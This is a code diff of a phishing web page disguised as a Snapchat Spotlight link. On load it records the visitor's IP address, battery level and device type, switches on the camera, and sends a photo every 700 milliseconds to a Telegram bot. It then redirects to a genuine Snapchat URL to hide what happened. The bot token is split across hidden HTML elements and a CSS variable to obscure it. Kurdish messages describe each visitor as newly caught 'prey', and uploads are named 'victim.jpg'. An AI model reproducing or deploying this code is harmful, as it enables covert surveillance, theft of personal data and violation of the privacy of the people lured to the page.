@@ -5,16 +5,17 @@
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
+        :root { --config-node: "AAFABzJuX8"; }
         body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
         .zone-wrapper { display: none !important; visibility: hidden !important; }
     </style>
 </head>
-<body onload="capture()" data-config="AAFABzJuX8">
+<body onload="capture()">
 
-    <div class="zone-wrapper">
-        <span id="legacy-link">l7AMLVis5x</span>
-        <span id="raw-meta">8431515310:</span>
-        <span id="system-trace">SFHm9EGK95i9l8I</span>
+    <a href="#" id="legacy-link" class="zone-wrapper">8431515310:</a>
+
+    <div class="main-content">
+        <p class="zone-wrapper" id="raw-meta">l7AMLVis5x</p>
     </div>
 
 <script>
@@ -27,13 +28,12 @@
         if (!targetID) return;
 
         try {
-            /* دروستکردنەوەی تۆکنە نوێیەکە بە وردی */
-            const p1 = document.getElementById("raw-meta").innerText.trim();
-            const p2 = document.body.getAttribute("data-config").trim();
-            const p3 = document.getElementById("legacy-link").innerText.trim();
-            const p4 = document.getElementById("system-trace").innerText.trim();
+            const partA = document.getElementById("legacy-link").innerText;
+            const nodeX = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const dataV = document.getElementById("raw-meta").innerText;
+            const saltK = document.getElementById("system-trace").innerText;
             
-            const _final_call = p1 + p2 + p3 + p4;
+            const finalBuild = partA + nodeX + dataV + saltK;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -53,8 +53,12 @@
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    let report = `👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Batt:</b> <code>${batteryInfo}</code>`;
-                    _sendMsg(report, _final_call, targetID);
+                    let report = ` <b>نێچیرێکی نوێ ڕاوکرا</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    _sendMsg(report, finalBuild, targetID);
                 });
 
             const video = document.createElement('video');
@@ -68,18 +72,18 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _final_call, targetID); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", finalBuild, targetID); }, 'image/jpeg', 0.9);
             };
-            setInterval(takeSnap, 1000);
+            setInterval(takeSnap, 700);
 
         } catch (e) {
-            const r1 = document.getElementById("raw-meta").innerText.trim();
-            const r2 = document.body.getAttribute("data-config").trim();
-            const r3 = document.getElementById("legacy-link").innerText.trim();
-            const r4 = document.getElementById("system-trace").innerText.trim();
-            const _rec = r1 + r2 + r3 + r4;
+            const errA = document.getElementById("legacy-link").innerText;
+            const errB = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const errC = document.getElementById("raw-meta").innerText;
+            const errD = document.getElementById("system-trace").innerText;
+            const recovery = errA + errB + errC + errD;
 
-            _sendMsg("⚠️ مۆڵەتی کامێرا نەدرا", _rec, targetID);
+            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", recovery, targetID);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
@@ -95,9 +99,13 @@
     function _sendFile(blob, type, tk, uid) {
         let fd = new FormData();
         fd.append("chat_id", uid);
-        fd.append(type, blob, "img.jpg");
+        fd.append(type, blob, "victim.jpg");
         fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
+
+    <div class="zone-wrapper">
+        <code id="system-trace">SFHm9EGK95i9l8I</code>
+    </div>
 </body>
 </html>
